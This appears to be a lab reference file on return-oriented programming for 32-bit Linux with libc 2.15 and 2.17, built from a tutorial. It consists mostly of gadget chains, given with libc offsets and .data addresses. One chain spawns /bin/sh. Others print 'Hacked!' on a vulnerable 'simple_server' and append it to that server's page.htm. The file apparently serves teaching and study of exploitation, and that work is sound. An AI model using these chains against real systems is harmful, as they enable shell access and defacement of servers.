**THIS FILE IS ONLY FOR REFERENCE**

Algorithm to perform ROP:

Note: ROP will not work if the -static flag is used while compiling the vulnerable programs.

-static flag: On systems that support dynamic linking, this prevents linking the shared libraries with the executables. On other systems, this option has no effect. 

https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html#Link-Options

"cat /proc/pid/maps" will not yield the location of libc in the memory if -static is used.

http://stackoverflow.com/questions/5130654/when-how-does-linux-load-shared-libraries-into-address-space

1. Find the base address of .data section
    
    Use the following commands
        gdb bin/rop/exploitable
        break main
        run
        info files

2. Commands needed to spawn a shell (the data segment addresses are for bin/rop/exploitable)

    --> From the ROP tutorial PDF:

    Data segment: 0x0804a024 - 0x0804a02c is .data
    Linked library segment: b7e18000-b7fc5000 r-xp 00000000 08:01 857        /lib/i386-linux-gnu/libc-2.17.so

    ROP command: 0xf5160L: pop ecx ; pop eax ;;
    Data       : 0x2f62696e: /bin
    Address    : 0x4: Offset for /bin (.data base)
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0xf5160L: pop ecx ; pop eax ;;
    Data       : 0x2f2f7368: //sh
    Address    : 0x8: Offset for //sh (.data base)
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0x34964L: xor eax eax ;;
    ROP command: 0x2e8bbL: pop ecx ; pop edx ;;
    Padding    : 0x01010101 (To neutralize pop ecx)
    Address    : 0xc: Offset for NULL (.data base)
    ROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;
    ROP command: 0xff102L: pop ecx ; pop ebx ;;
    Address    : 0xc: Offset for NULL (.data base)
    Address    : 0x4: Offset for /bin (.data base)
    ROP command: 0x14da28L: add eax 0xb ;;
    ROP command: 0xbaa75L: call dword [gs:0x10] ;;

    --> Mixture of paper and tutorial's algorithms:

    Linked library segment: b7e18000-b7fc5000 r-xp 00000000 08:01 857        /lib/i386-linux-gnu/libc-2.17.so
    return address: 0xbfffed5c

    ROP command: 0xf5160L: pop ecx ; pop eax ;;
    Data       : 0x2f62696e: /bin
    Address    : End of stack
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0xf5160L: pop ecx ; pop eax ;;
    Data       : 0x2f2f7368: //sh
    Address    : End of stack (Return address + size of stack *4 ) + 4
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0x34964L: xor eax eax ;;
    ROP command: 0x2e8bbL: pop ecx ; pop edx ;;
    Padding    : 0x01010101 (To neutralize pop ecx)
    Address    : End of stack + 8
    ROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;
    ROP command: 0xff102L: pop ecx ; pop ebx ;;
    Address    : End of stack + 8
    Address    : End of stack
    ROP command: 0x14da28L: add eax 0xb ;;
    ROP command: 0xbaa75L: call dword [gs:0x10] ;;

    --> From the ROP tutorial PDF:

    Data segment: 0x0804a010 - 0x0804a018 is .data
    Linked library segment: b7e20000-b7fc3000 r-xp 00000000 08:01 857        /lib/i386-linux-gnu/libc-2.15.so

    ROP command: 0xf2d21L: pop ecx ; pop eax ;;
    Data       : 0x2f62696e: /bin
    Address    : 0x4: Offset for /bin (.data base)
    ROP command: 0x2d71fL: mov [eax] ecx ;;
    ROP command: 0xf2d21L: pop ecx ; pop eax ;;
    Data       : 0x2f2f7368: //sh
    Address    : 0x8: Offset for //sh (.data base)
    ROP command: 0x2d71fL: mov [eax] ecx ;;
    ROP command: 0x341a5L: xor eax eax ;;
    ROP command: 0x2df7bL: pop ecx ; pop edx ;;
    Padding    : 0x01010101 (To neutralize pop ecx)
    Address    : 0xc: Offset for NULL (.data base)
    ROP command: 0x8d5e4L: mov [edx] eax ; mov eax edx ;;
    ROP command: 0x341a5L: xor eax eax ;;
    ROP command: 0xfca82L: pop ecx ; pop ebx ;;
    Address    : 0xc: Offset for NULL (.data base)
    Address    : 0x4: Offset for /bin (.data base)
    ROP command: 0x148428L: add eax 0xb ;;
    ROP command: 0xb8dc5L: call dword [gs:0x10] ;;

3. Commands needed to print "Hacked!" in the terminal console of the vulnerable server
    
    Library version - libc-2.17

    Data segment of simple_server: 0x0804b088 - 0x0804b090 is .data

    ROP command: 0xf5160L: pop ecx ; pop eax ;;
    Data       : 0x6b636148: Hack
    Address    : 0x4: Offset for Hack (.data base)
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0xf5160L: pop ecx ; pop eax ;;
    Data       : 0x21216465: ed!!
    Address    : 0x8: Offset for ed!! (.data base)
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0x34964L: xor eax eax ;;
    ROP command: 0x7d9f8L: mov eax 0x1 ;;
    ROP command: 0x122339L: mov edx eax ; mov eax edx ;;
    ROP command: 0xdf572L: mov ebx edx ;;
    ROP command: 0x34964L: xor eax eax ;;
    ROP command: 0x2e8bbL: pop ecx ; pop edx ;;
    Address    : 0x4: Offset for Hack (.data base)
    Address    : 0xc: Offset for NULL (.data base)
    ROP command: 0x8e034L: mov [edx] eax ; mov eax edx ;;
    ROP command: 0x34964L: xor eax eax ;;
    ROP command: 0xa9a40L: mov eax 0x7 ;;
    ROP command: 0x122339L: mov edx eax ; mov eax edx ;;
    ROP command: 0x1369e7L: inc edx ;;
    ROP command: 0x34964L: xor eax eax ;;
    ROP command: 0xa9a10L: mov eax 0x4 ;;
    ROP command: 0xbaa75L: call dword [gs:0x10] ;;


4. Commands needed to append "Hacked!" to "page.htm" of the vulnerable server

    Library version - libc-2.17

    Data segment of simple_server: 0x0804b088 - 0x0804b090 is .data

    ROP command: 0xf5160L: pop ecx ; pop eax ;; Store page
    Data       : 0x65676170: page
    Address    : 0x4: Offset for page (.data base)
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0xf5160L: pop ecx ; pop eax ;;
    Data       : 0x6d74682e: .htm
    Address    : 0x8: Offset for .htm (.data base)
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0x742aeL: pop ebx ; ret ; xor eax eax ;; Store address of page.htm in ebx, the xor doesn't work
    Address    : 0x4: Offset for page (.data base)
    ROP command: 0x34964L: xor eax eax ;;
    ROP command: 0x2e8bbL: pop ecx ; pop edx ;; Store null after page.htm
    Padding    : 0x01010101: (To neutralize pop ecx)
    Address    : 0xc: Offset for NULL (.data base)
    ROP command: 0x8e034L: mov [edx] eax ; mov eax edx ;;
    ROP command: 0x83f67L: xor edx edx ; mov eax edx ;; Clear edx, eax
    ROP command: 0x2e8bbL: pop ecx ; pop edx ;; Store 0x2
    Padding    : 0x02020202: (To neutralize pop ecx)
    Address    : 0x20: Offset for 0x2 (.data base)
    ROP command: 0x1171f0L: mov eax 0x2 ;;
    ROP command: 0x8e034L: mov [edx] eax ; mov eax edx ;;
    ROP command: 0x143f2cL: mov ecx [eax] ; mov [edx] ecx ; pop ebx ;;
    Address    : 0x4: Offset for page (.data base)
    ROP command: 0x83f67L: xor edx edx ; mov eax edx ;; Clear edx, eax
    ROP command: 0xa9a10L: mov eax 0x4 ;;
    ROP command: 0x41e3aL: inc eax ;; Store 0x5 in eax (we aren't using mov eax 0x5 because its address introduces space and breaks the shellcode)
    ROP command: 0xbaa75L: call dword [gs:0x10] ;;
    ROP command: 0x122339L: mov edx eax ; mov eax edx ;; 
    ROP command: 0xdf572L: mov ebx edx ;; ebx contains fd
    ROP command: 0xf5160L: pop ecx ; pop eax ;;
    Data       : 0x6b636148: Hack
    Address    : 0x10: Offset for Hack (.data base)
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0xf5160L: pop ecx ; pop eax ;;
    Data       : 0x21216465: ed!!
    Address    : 0x14: Offset for ed!! (.data base)
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0x34964L: xor eax eax ;;
    ROP command: 0x2e8bbL: pop ecx ; pop edx ;; Store null after Hacked!!
    Address    : 0x10: Offset for Hack (.data base)
    Address    : 0x18: Offset for NULL (.data base)
    ROP command: 0x8e034L: mov [edx] eax ; mov eax edx ;;
    ROP command: 0x83f67L: xor edx edx ; mov eax edx ;; Clear edx, eax
    ROP command: 0xa9a40L: mov eax 0x7 ;;
    ROP command: 0x41e3aL: inc eax ;;
    ROP command: 0x122339L: mov edx eax ; mov eax edx ;;
    ROP command: 0xa9a10L: mov eax 0x4 ;; eax writes into a file
    ROP command: 0xbaa75L: call dword [gs:0x10] ;;
    ROP command: 0xa9a30L: mov eax 0x6 ;;
    ROP command: 0xbaa75L: call dword [gs:0x10] ;;